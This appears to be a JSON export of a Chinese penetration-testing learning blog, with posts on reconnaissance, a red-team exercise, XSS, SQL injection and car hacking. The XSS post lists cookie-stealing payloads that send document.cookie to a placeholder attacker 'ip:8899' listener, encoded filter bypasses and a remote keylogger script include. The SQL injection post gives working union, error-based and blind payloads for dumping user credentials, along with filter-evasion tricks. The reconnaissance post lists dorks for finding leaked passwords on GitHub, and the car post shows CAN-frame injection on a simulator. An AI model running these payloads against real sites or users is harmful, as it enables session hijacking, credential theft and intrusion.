、http://dns.aizhan.com\n敏感信息收集其实敏感信息在护网时可以当作漏洞提交了。\n例如：数据库文件、SQL注入、服务器配置信息、甚至是通过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息。从而达到渗透测试的目的。\n\n\n\n关键字\n含义\n\n\n\nsite\n指定搜索域名 例如：site:baidu.com\n\n\ninurl\n指定URL中是否存在某些关键字 例如：inurl:.php?id=\n\n\nintext\n指定网页中是否存在某些关键字 例如：intext:网站管理\n\n\nfiletype\n指定搜索文件类型 例如：filetype:txt\n\n\nintitle\n指定网页标题是否存在某些关键字 例如：intitle:后台管理\n\n\nlink\n指定网页链接 例如：link:baidu.com 指定与百度做了外链的站点\n\n\ninfo\n指定搜索网页信息 info:baidu.com\n\n\n还有这个高级用法查询：https://www.exploit-db.com/google-hacking-database\n还有从数据包中发现目标用到编程语言和服务器信息。\n在GitHub上进行收集信息这个其实得看前面收集信息的程度。\nGithub之邮件配置信息泄露：site:Github.com smtp、site:Github.com smtp @qq.com\nGithub之数据库信息泄露：site:Github.com sa password、site:Github.com root password、site:Github.com User ID=’sa’;Password\nGithub之svn信息泄露：site:Github.com svn、site:Github.com svn username\nGithub之综合信息泄露：site:Github.com password、site:Github.com ftp ftppassword、site:Github.com 密码、site:Github.com 内部\n收集真实IP地址先看是否有CDN，使用：http://ping.chinaz.com/\n没有使用CDN可以直接PING\n如果目标使用CDN，需要绕过CDN来获取真实IP地址。1、内部邮箱源  收集到内部邮箱服务器IP地址2、网站phpinfo文件 phpinfo.php3、分站IP地址，查询子域名  CDN很贵，很有可能分站就不再使用CDN。4、国外访问  https://asm.ca.com/en/ping.php5、查询域名解析记录  https://viewdns.info/\n当收集到真实IP就可以直接访问，如果和网址访问一样就代表真实IP，否则则为假。\n端口信息收集使用nmap进行端口扫描\nnmap -A -v -T4 IP   #快速全面探测\nnmap IP --script banner -p 22   #探测22好端口banner信息\nnmap -p 端口号 -sV IP  \nnmap -O IP   #获取操作系统的信息\nnmap -A -V IP   #对目标进行完整的测试\n\n使用masscan\nmasscan --ports 1-10000 目标IP --adapter-ip 本机IP\n\n--adapter-ip 指定发包的ip地址\n\n--adapter-port 指定发包源端口\n\n--adapter-mac 指定发包的源MAC地址\n\n--router-mac 指定网关MAC地址\n\n--exclude IP地址范围黑名单，防止masscan扫描\n\n--excludefile 指定IP地址范围黑名单文件\n\n--includefile,-iL 读取一个范围列表进行扫描\n\n--wait 指定发包后的等待时间\n\n使用Dmitry\ndmitry -p IP\ndmitry -pb IP #获取banner信息\n\n使用netcat\nnc -nvz IP 端口范围\nnc -nvz 192.168.249.110 20-30\nnc -Vn IP 端口号 #获取端口banner信息\n\n\n\n\n端口\n端口说明\n攻击方法\n\n\n\n22\nSSH远程连接\n爆破、SSH隧道及内网代理转发、文件传输\n\n\n23\nTelnet远程连接\n爆破、嗅探、弱口令\n\n\n3389\nrdp远程桌面\nShift后门、爆破\n\n\n5900\nVNC远程连接\n弱口令、RCE\n\n\n5632\nPcAnywhere远程连接\n嗅探、代码执行\n\n\n收集web站点信息CMS在线识别：http://whatweb.bugscaner.com/look/  、 http://www.yunsee.cn/finger.html\nCMS本地识别：whatweb、御剑web指纹识别程序、大禹CMS识别程序 https://github.com/Ms0x0/Dayu\nCMS漏洞查询利用：https://bugs.shuimugan.com\n后台扫描探测工具：\n老版本：                                                              新版本：\n1、御剑后台扫描工具                                         dirmap2、wwwscan命令行工具                                    dirsearch3、dirb命令行工具                                              .git源码泄露4、dirbuster扫描工具\n国外的网站使用wordpress,可以使用wpscan工具进行安全测试。\n使用扫描网站对IP进行探测使用shodan：https://account.shodan.io\n使用钟馗之眼：https://www.zoomeye.org/\n使用FOFA：https://fofa.so/\n使用shodan查看是否有蜜罐：\nshodan honeyscore IP地址\n\n使用集成工具进行信息收集HGather：https://github.com/BaizeSec/HGather\nrailgun：https://github.com/lz520520/railgun  这是使用说明书\n以上内容大部分来自网络。。。。。。\n","slug":"信息收集流程","date":"2021-11-20T11:43:56.000Z","categories_index":"流程","tags_index":"信息收集","author_index":"Longw"},{"id":"c5a6228e829628ebe329c5df737b79b7","title":"第一次护网","content":"\n\n老实讲，这个我都不好意思放出来。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。\n。。。。。、\n、。。。。、。。\n。。。。。。\n。。。。。\n。。。。\n。。。。。\n。。。\n。。。。。\n.。。。。。\n。。。。。\n。。。。。\n。。。。。\n。。。。\n。。。\n。\n。。。。。\n但是要知耻后勇。。。\n小计没想到第一次护网居然是老家。。。。。。。。\n临近年关，等保测评一大批，居然还有护网，虽然只有红队。刚刚实习就上战场了。让我颇感无奈。。。\n不过实战也是学习最多的，基础薄弱啊。。学的杂并且很浅。。。\n一开始发了一些测试网站，尝试入侵。结果不知道如何下手，准备先用扫描工具扫描一波。。更无奈的是awvs又出问题了！！！！无奈只好卸载。卸载好准备重装，结果弹窗重启，电脑卡死了。。。只好强制关机。重启后使用appscan扫描了一个站点，无发现。再次使用弹窗电脑阻止运行。😅😅😅！！！！！！！！！！！！\n没办法了，只有手测。一个一个试试。后台很多，不幸的是我跑的后台基本都不能爆破。好不容易找到弱口令再想上交已经不加分了。😅\n一心想着sql注入，尝试了一批站点全是防火墙过不去。。。。。注册论坛，xss发布任务也没有弹窗。。\n乱打一通，全部白干。。。。。。。。。。。。。。。。。\n好笑的是旁边盛世航明主办方的队伍还在那里嘲讽。。。虽然我没有丧失信心，但是还是挺羞愧的。\n也是挺佩服他们的，短短几个小时就攻下了好几个站点。。。\n经验忽略了最要紧的信息收集，吃了很大很大的亏。。。。下决心，先把这方面弄到流程化。\n其他先按部就班的学吧。还要会对cve漏洞进行利用。\n不够细心，容易忽略细节，关键就是细节。\n看了一下另一支队伍挖到的sql注入，不仅是他信息收集做的好，还有他很细心。一直手动测试，结果发现忽略了工具的使用。\n思路很重要，但是你得到一定水平才知道该怎么办。\n一定要定一个流程，没什么发现就按照流程走一遍。有了发现才能进行深入。\n反正也是加油吧！！！努力学习！！！希望有一天也能打个护网前几试试。\n","slug":"第一次护网","date":"2021-11-19T15:36:33.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"092a8eb566bb4d51073324d6cfbab7e6","title":"XSS总结","content":"\n\npayload来自csdn-仙女象\n反射型XSS&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&lt;&#x2F;script&gt;  \n#获取cookie，需要攻击机开机http服务\npython2 -m SimpleHTTPServer 8899\n\n大小写绕过\n使用其他标签\n编码绕过\n&lt;sCript&gt;alert(1)&lt;&#x2F;script&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;alert(1)&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;\n\n&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&#39;&amp;#60;&amp;#105;&amp;#109;&amp;#103;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#105;&amp;#112;&amp;#58;&amp;#56;&amp;#56;&amp;#57;&amp;#57;&amp;#47;&#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#43;&#39;&amp;#34;&amp;#47;&amp;#62;&#39;&amp;#41;&gt;hh&lt;&#x2F;a&gt;\n#onclick后面是html实体编码了，明文payload是&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;hh&lt;&#x2F;a&gt;\n\n&lt;img alt&#x3D;x οnmοuseοver&#x3D;alert(1)&gt;\n&lt;img alt&#x3D;x οnmοuseοver&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;\n&lt;input οnblur&#x3D;&quot;alert(1)&quot;&gt;\n&lt;input οnblur&#x3D;&quot;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&quot;&gt;\n\n存储型XSS&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&lt;&#x2F;script&gt;\n#获取cookie，需要攻击机开机http服务\npython2 -m SimpleHTTPServer 8899\npython3 -m http.server 8899\n\n修改客户端源代码绕过长度限制\n大小写绕过，双写绕过\n&lt;scrip&lt;script&gt;t&gt;alert(1)&lt;&#x2F;scrip&lt;script&gt;t&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;alert(1)&gt;\n&lt;iframe οnlοad&#x3D;alert(1)&gt;&lt;&#x2F;iframe&gt;\n\n&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&#39;&amp;#60;&amp;#105;&amp;#109;&amp;#103;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#105;&amp;#112;&amp;#58;&amp;#56;&amp;#56;&amp;#57;&amp;#57;&amp;#47;&#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#43;&#39;&amp;#34;&amp;#47;&amp;#62;&#39;&amp;#41;&gt;hh&lt;&#x2F;a&gt;\n\n\nDOM型XSS-payload来自csdn谢公子http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;alert(&#39;hack&#39;)&lt;&#x2F;script&gt;\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt; \n我们得先闭合前面的标签，我们构造语句闭合option标签：\n &lt;option value&#x3D;&#39;     &quot; + lang + &quot;      &#39;&gt;  &quot;  + decodeURI(lang) +  &quot;  &lt;&#x2F;option&gt;\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&gt;&lt;&#x2F;option&gt;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt; \n\n继续构造语句去闭合select标签\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D; &gt;&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt;\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;a?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;  #获取cookie\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;document.body.innerHTML&#x3D;&quot;&lt;div style&#x3D;visibility:visible;&gt;&lt;h1&gt;DOM XSS By SKI12&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&gt;\n#篡改页面\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;keylogger.js&quot;&gt;&lt;&#x2F;script&gt;\n#键盘记录，有js文件和php文件。来自于csdn-Mi1k7ea\n\n","slug":"XSS总结","date":"2021-11-09T13:57:15.000Z","categories_index":"安全漏洞基础","tags_index":"owasp TOP 10","author_index":"Longw"},{"id":"9ddada27b22150ae5fda04e61970ba8b","title":"SQL注入1","content":"\n\n最近本来是打算投简历看看的，结果当场面试了，很尴尬。笔试发现自己菜的扣脚。。。毕竟接触时间较短，发现好多我不懂的问题，连http协议都有地方不会。。。。。。。。https的s是用来防止中间人攻击的，反射型xss不是在服务器上。\n一个漏洞一个漏洞的总结吧。。。。\n常见注入点\n表单中的输入域\n URL的参数\n Cookie或者隐藏域\n\n注入点检测?id&#x3D;1     #测试点\n?id&#x3D;1&#39;   #单引号报错\n?id&#x3D;1&quot;   #双引号报错\n?id&#x3D;1\\   #反斜杠报错\n?id&#x3D;1&#39;--+    #注释后面\n?id&#x3D;1&#39;)--+\n?id&#x3D;1&#39;))--+  #有的需要加)或者两个))\n?id&#x3D;1 and 1&#x3D;1 #数字型不变逻辑,后面可加注释如:--+,#等\n?id&#x3D;1 and 1&#x3D;2 #空集逻辑\n?id&#x3D;1 or 1&#x3D;1  #全集逻辑\n?id&#x3D;1&#39;and &#39;1&#39;&#x3D;&#39;1 #字符型不变逻辑，其他如上\n?id&#x3D;1+and+1&#x3D;1--+  #用加号代替空格\n上面还可以进行url编码，有些浏览器自动将空格编码，有些则没有，可以自己利用url编码工具进行编码。\n前面的如果有明显变化的，表示可能存在注入点。若没有明显变化,则可以使用sleep函数测试。\n?id&#x3D;1&#39; and sleep(5)  #用sleep函数进行注入点测试\n当然我们可以直接利用sqlmap进行注入点检测，在kali中\nsqlmap -u http:&#x2F;&#x2F;xxx.xx?id&#x3D;1   #将会自动检测\n\n注入利用–MySQL判断数据库user(),version()\n不同的数据库返回值都各有特征，进而推断是什么数据库类型。\n如user()函数返回情况：\n     mysql返回root@localhost\n     oracle返回sys\n     sqlserver返回sa\n执行成功，即探子回报。说明程序对函数，括号()和子查询并未做过滤，可能可以执行函数、子查询等复杂逻辑。\n探子没有回报，基本上说明注入攻击困难或者注入可能性很小。\n\nGET类型-有回显点order by 3  #判断字段数\n?id&#x3D;1&#39;and 0&#x3D;9 union select 1,2,3  #判断回显点\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(schema_name),3 from information_schema.schemata --+ \n#获取所有库名\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(distinct table_schema),3 from    information_schema.tables --+\n#获取所有库名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() --+   #获取表名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; --+   #获取字段名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(username,0x3a,password),3 from users--+  #获取字段值\n\n\n相关函数和数据库结构信息User() current_user() session_user() 返回当前连接的用户名（包含主机名）\nversion() 数据库版本号\ndatabase() 当前连接的数据库名\nlength()   计算字符串长度\nleft()    取最左边的字符\nsubstring() 取字符串中任意长度字长\nposition()  返回字符所在字符串中的位置\nlocate()    返回字符所在字符串中的位置\n在Mysql 5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables(表名)、columns(列名或字段名)。ROUTINES 存储过程或者函数信息,VIEWS 视图信息,TRIGGERS 触发器信息\n\n在schemata表中，schema_name字段用来存储数据库名。\n在tables表中，table_schema和table_name分别用来存储数据库名和表名。\n在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)\n拓展limit关键字  limit m,n 从m行开始，到m+n行\n\n盲注?id&#x3D;1&#39;and if(left(version(),1)&#x3D;5,sleep(1),2)  #利用sleep函数判断版本号或者用户名，密码等\n?id&#x3D;1&#39; and if(substring(uname,1,1)&#x3D;&#39;b&#39;,benchmark(10000000,md5(&#39;b&#39;)),1)  #Benchmark穷举法猜测用户名和密码等\nSelect sleep(1);睡眠1秒\nSelect left(user(),1)获得user()最左边的1位\nSubstring()获得字符串任意位置的任意个字符\nBenchmark()对运算执行压力测试\nIf()表达式，第一个表达式为真，则执行第二个表达式，否则执行第三个表达式\n一般利用工具盲注，太麻烦太耗时间了。\n\n报错注入没有错误也要制造错误，并把查询的信息让错误带出来告诉注入者到底有什么东西，把所有家底能透露的都透露了。\n相关函数：If(),rand(),floor(),ifnull(),concat,group_concat()\nSelect count(*),concat(version(),floor(rand()*2),user()) as a from users group by a  #暴露系统用户名敏感信息\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取数据库\n\nselect count(*),concat((select (select (SELECT schema_name FROM information_schema.schemata limit 0,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2)) x_col from information_schema.tables group by x_col   #获取所有库名\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+  #获取表名\n\nselect count(*),concat((select (select (SELECT table_name FROM information_schema.tables where table_schema&#x3D;database() limit 0,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2))x_col from information_schema.tables group by x_col   #获取所有表名\n\n\nid&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取用户信息\n\n?id&#x3D; 0&quot; union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+   #双引号报错注入，前面是单引号。\n\n?id&#x3D;1 and updatexml(2,concat(0x7e,database(),0x7e),1);   \n#利用updatexml函数进行注入,database()是系统函数返回系统变量database的值。@@version代表系统变version\n?id&#x3D;1 and updatexml(2,concat(0x7e,@@version,0x7e),1);\n\n?id&#x3D;1 and extractvalue(1,concat(0x7e,database(),0x7e));   #利用extractvalue函数进行注入\n?id&#x3D;1 and extractvalue(1,concat(0x7e,@@version,0x7e));\n\n宽字节注入当数据库使用gbk编码时，使用%DF%5C，%bf%5c进行宽字节注入，将单引号闭合。\nasscii大于128， GBK首字节对应0x81–0xFE,尾字节对应0x40–0xFE(除去0x7F)。\nSQLMAP使用–tamper=unmagicquotes.py脚本。\n二次注入注入payload，再利用如重置密码功能修改管理员密码。\nadmin&#39;-- -\n\n注入payload，触发xss攻击。\nAccess注入(ASP+Access)只有表，直接用sqlmap查表,基本基于字典\nsqlmap -u url --tables\n\nAccess偏移注入知道表名，得不到字段。\n1.判断字段数 order by\n2.判断表名  使用union select * from 表名,如admin\n3.偏移注入  利用公式注入\n?id&#x3D;1+union+select+1,2,3,4,5,6,7,8,9+from+admin\n?id&#x3D;1+union+select+1,2,3,4,5,*+from+admin  \n#一个一个测试，到5用*号代替显示正常，利用公式\n9-5&#x3D;4;9-4*2&#x3D;1;则从1之后开始\n当前admin表中字段数就为4；\n?id&#x3D;1+union+select+1,a.id,b.id,*+from+(admin+as+a+inner+join+admin+as+b+on+a.id&#x3D;b.id)\n\n\n\n规避检查or–+2=!!!2 类假!!!2为真的结果，利用不变逻辑的!!!替代空格注释替代 and//select//uname//from//users+号连接字符替换\n大小写绕过\nand\n改为\nAnD \n\n双写绕过\nunion\n改为\nuniunionon\n\nand改为&amp;&amp;，or改为||.\n/*!内联*/  内联注释，会执行看里面的内容\n&#x2F;*!union*&#x2F; select 1,2,3 --+\n\n/**/多行注释\nun&#x2F;**&#x2F;ion select 1,2,3 --+\n\n将语句进行url编码\n十六进制码替代%20ASCII码替换char(32)\nand substring(user(),1,1)&#x3D;‘z’\n改为\nand asci(substring(user(),1,1))&#x3D;122   #规避了单引号\n\n空格替换\n%0a  新建一行\n%09  TAB键（水平）\n%0d  return功能\n%0b  TAB键（垂直）\n%0c  新建一页\n%20  就是空格\nhex编码\n\n还有好多内容啊，等后面一一总结吧！！！\n现在的网站基本上都防御了sql注入。想在网站上找到注入点真难。。还是玩靶场好一点。\n","slug":"SQL注入1","date":"2021-11-08T11:24:23.000Z","categories_index":"安全漏洞基础","tags_index":"owasp TOP 10","author_index":"Longw"},{"id":"ebc4d430e2c23dfe4e07a222f7299552","title":"汽车黑客入门","content":"\n\n最近在telegram上找到一个安全实验室的成员，关注了一下。发现她的研究方向是汽车黑客，看了一下他发的汽车黑客入门，挺有意思的。。。。。。\n分为基础篇，模拟器篇，案例篇。\n原作者：https://www.hackers-arise.com/automobile-hacking\n基础篇仔细看了一下，前面讲的都是硬件、协议啊、数据包类型啊之类的。大概能看懂，就不写了，无聊嘛。后面写到是买一个蓝牙ODB II迷你接口用来连接连接到汽车的OBD II接口。完蛋，第一篇没车不弄了。\n后面就是使用kali中msf自带的攻击模块，进行攻击。\nICS模拟器篇因为没车，所以就玩模拟器。\n\n安装模拟器\n\n我们打开kali终端安装必要的依赖\nsudo apt install libsdl2-dev libsdl2-image-dev -y\n\n等待安装完成，接下来就是安装模拟器\ngit clone https:&#x2F;&#x2F;github.com&#x2F;zombieCraig&#x2F;ICSim\n\n等待安装完成。\nsudo modprobe vcan &#x2F;&#x2F;加载模块\nsudo ip link add dev vcan0 type vcan &#x2F;&#x2F;为设备名称为vcan0类 型为vcan的设备增加虚拟接口\nsudo ip link set up vcan0 &#x2F;&#x2F;激活vcan0\nifconfig vcan0 &#x2F;&#x2F;验证配置\n\ncd ICSim    #进入下载好的目录\nsudo bash setup_vcan.sh     #运行文件\n\n前面正常的话就可以进行编译了。\nmake\n\n\n玩模拟器\n\n接下来打开模拟器\n.&#x2F;contorls vcan0     #这是控制界面\n然后再打开一个终端进入安装目录\n.&#x2F;icsim vcan0    #这是汽车模拟器\n\n然后你的界面就会出现两个小窗口，这就是你的模拟器和控制器。没有截图，纯手工描写。\n接下来就是叫你如何使用模拟器\n有手柄按照操控界面提示来\n没有手柄就用键盘\n数字旁边有个上下左右那个\n按-&gt; 加上enter 就会亮起信号灯，另一个就不用讲了\n按住-&gt; + shift + a&#x2F;b&#x2F;xy 就会分别打开汽车的车门。至于关门，看不懂，研究好久没弄出来。\n按住 ^ + enter  就会加速 \n\n要学的暂时就这么多了。\n因为上一篇没写，所以没安装工具。现在来安装工具。\ngit clone https:&#x2F;&#x2F;github.com&#x2F;linux-can&#x2F;can-utils.git\n\n下面是工具的一些基础知识\ncan-utils工具可以被分为几个功能组\n1. 显示、记录、生成和重放CAN通信的基本工具\n2. 通过IP socket 访问CAN\n3. CAN内核网关的配置 \n4. CAN总线测量\n5. ISO-TP工具 \n6. 日志文件转换器 \n7. 串行线规范（slc）配置 \n因为刚刚起步，我们将只关注基本工具和日志文件转换器。\ncan-utils中的工具及其功能的完整列表如下： \n\n1. 显示，记录，生成和重放CAN流量的基本工具\ncandump：显示，过滤和记录CAN数据，导出到文件\ncanplayer：重播CAN日志文件\ncansend：发送单个帧\ncangen：生成（随机）CAN流量\ncansniffer：比对CAN数据内容的差异（仅11位CAN ID） \n\n2. 通过IP socket进行CAN访问\ncanlogserver：记录来自远程或本地主机的CAN帧\nbcmserver：交互式BCM配置（远程&#x2F;本地）\nsocketcand：通过TCP &#x2F; IP socket 使用RAW &#x2F; BCM &#x2F; ISO-TP socket\n\n3. CAN内核网关配置\ncangw：用于netlink配置的CAN网关userpace工具\n\n4. CAN总线的测量和测试\ncanbusload：计算并显示CAN总线负载\ncan-calc-bit-timing：内核空间比特率计算的用户空间版本\ncanfdtest：全双工测试程序（DUT和主机部分） \n\n5. 适用于Linux的ISO-TP工具ISO15765-2：2016\nisotpsend：发送单个ISO-TP PDU\nisotprecv：接收ISO-TP PDU\nisotpsniffer：“窃听” ISO-TP PDU\nisotpdump：“窃听”并解释CAN消息（CAN_RAW）\nisotpserver：用于简单的TCP &#x2F; IP 与 ISO 15765-2 桥接（ASCII HEX）的IP服务器\nisotpperf：ISO15765-2协议的性能可视化\nisotptun：通过ISO-TP在CAN上创建双向IP隧道\n\n6. 日志文件转换器\nasc2log：将ASC日志文件转换为紧凑型CAN框架日志文件\nlog2asc：将紧凑型CAN框架日志文件转换为ASC日志文件\nlog2long：将紧凑的CAN帧表示形式转换为用户可读 \n\n7. 串行线路规范配置（用于slcan驱动程序）\nslcan_attach：用于串行线CAN接口配置的用户空间工具\nslcand：用于串行线CAN接口配置的守护程序\nslcanpty：使用slcan ASCII协议为应用程序创建一个pty\n\n安装完成之后，我们先进入工具目录\nCCansniffer过滤特定流量\ncansniffer -c vcan0    #用来嗅探CAN的流量\n当我们使用-c选项时，正在变化的值会变成红色，以帮助我们识别这些关键值。\n使用-h参数查看帮助\n\n回车后，会发现一直跳跳跳，正常现象。\n接下来输入\n-000000\n\n输入完，回车。就会发现跳的流量没有了。\n+40C    #就会显示ID&#x3D;40C的流量\n\nCandump捕获CAN流量\ncandump -c -l vcan0   #-l 参数来记录，-c参数对输出进行着色。\n\ncandump -c -l -s 0 -a vcan0   #记录的同时，进行输出\n\ncanplayer进行重放\ncanplayer -I candump-xxx.log   #因为文件名不一样，直接tab键补全\n\ncansend 发送自定义帧\ncansend vcan0 40C#033133383439000d      #发送40C这一帧数据\nvcan0是接口\n40C＃是框架ID\n000005500108000D是我们要发送的数据\n\n\n逆向\n\n在了解了工具的使用之后，我们开始逆向工程。在控制板输入加油门指令进行加速，并且抓取数据流。\n当速度达到100就可以松开。\ncansniffer -c vcan0\n-000000\n+244                 #ID为244的数据包可能是汽车加速的数据包\n\ncansend vcan0 244#0000003812   #向汽车发送数据包，看能否是汽车速度达到100\n\n因为信号单一，看不到任何效果，那么就可以使用\nwhile true; do cansend vcan0 244#0000003812; done\n\n执行，就可以看到汽车油门指针不断的向100跳跃。\n案例篇(原作者：https://www.hackers-arise.com/automobile-hacking)就是讲了一次入侵汽车系统的操作过程。\n这是视频地址：https://youtu.be/xHCUpLBGIKQ\n下面是分析：\nStep1：从车辆捕获低频信号\n这个种攻击通过一个射频（RF）链路转发来自车辆的低频（LF）信号。每个射频链路由一个发射器和一个接收器组成。\nStep2：将LF转换为2.5GHZ并发送到接收器\n发射器捕获车辆的低频（LF）信号并转换为2.5GHz。然后，该信号通过空中（最长100m）发送到接收器，该接收器再将其转换回LF信号。\nStep3：放大信号并发送到LF天线\n接收器处的LF信号被放大并发送到环路LF天线，该天线复制车辆最初发送的信号。然后使用环形LF天线传输信号以打开门，然后启动发动机。\n入侵汽车报警系统以控制车辆由于许多汽车使用的钥匙存在众所周知的漏洞，人们一直在通过购买汽车报警系统来弥补这一缺陷。\n许多这样的钥匙都可以被上面所讲述的中继攻击来入侵。因此，汽车报警器供应商一直在销售高端（有些高达5000美元）的汽车报警系统，以弥补这一风险，并标榜自己是 “不可破解的”（这就像在黑客面前挥舞红色斗篷一样）。\n事实证明，许多这样的报警系统实际上比车辆上的钥匙或其他数字系统更容易被黑。 \n最近，Pentest Partners证明他们只需篡改电子邮件用户重置选项的一些参数（一种微不足道的网络黑客技术）就足以控制这些系统。 \n下面是提供这些报警系统app之一的截图。正如你所看到的，这个应用程序使用户可以远程锁定、获得车辆地理定位和启动停止车辆。如果攻击者能够修改这个应用程序的用户，那么他们即使不是合法车主也可以做所有这些操作。\n\n参数篡改当Pentest Partners的成员在Viper报警系统上选择 “修改用户 “选项时，他们发现这个请求没有被正确验证，如下图所示。 \n因此，他们可以简单地发送一个POST请求来修改用户和密码并控制车辆。这可以通过BurpSuite、Paros Proxy或Tamper Data等代理工具完成。然后，合法用户被锁在自己的车外，黑客则可以控制车辆。 \n\n正如你在下面看到的，用户的电子邮件和密码被通过写好都漏洞利用脚本改成了攻击者想要的，现在攻击者可以随意解锁和启动、停止车辆。\n\nPandora案例在潘多拉公司（Pandora）的一个类似系统中，在 “修改用户 “选项中也发现了这种缺乏验证的情况。\n在这里，黑客可以简单地用他们自己的电子邮件地址修改 “电子邮件 “字段，并使用一个 “id “号码来发送一个更改用户和密码的请求。 \n\n正如你在下面看到的，黑客同样能够利用脚本改变用户的电子邮件地址和密码并控制车辆。\n\n随着运输系统日益数字化，汽车或车辆入侵攻击是网络安全的最前沿。 \n这些车辆的制造商正在犯15年前在传统IT系统中常见的，同样的错误。这些报警系统制造商犯了一个非常基本的错误，没有验证用户修改功能，使攻击者能够通过简单的参数篡改来控制 